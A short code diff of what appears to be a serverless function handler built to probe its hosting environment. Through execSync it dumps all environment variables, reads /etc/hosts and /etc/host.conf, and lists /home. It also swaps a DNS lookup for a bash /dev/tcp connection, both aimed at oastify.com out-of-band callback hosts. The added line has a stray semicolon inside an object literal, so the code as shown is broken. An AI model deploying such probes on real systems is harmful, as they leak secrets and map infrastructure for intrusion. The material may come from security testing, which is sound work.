@@ -8,8 +8,10 @@ exports.handler = async function (event, context) {
       env: execSync("printenv").toString().trim(),
       command: execSync("cat /etc/host.conf").toString().trim(),
       command2: execSync("cat /etc/hosts").toString().trim(),
-      command3: execSync("cat /etc/image-id").toString().trim(),
-      command4: execSync("dig dep1.ztwfbmyqfew7zg53wpz7s53gw72yqwel.oastify.com").toString().trim(),
+      command3: execSync("pwd").toString().trim(),
+      command4: execSync("ls -la /home/").toString().trim(),
+      
+      command5: execSync('timeout 2 bash -c "</dev/tcp/function.727nku7yom5f8oeb5x8f1dco5fb6z5nu.oastify.com/80" 2>&1').toString();
     };
 
     return {
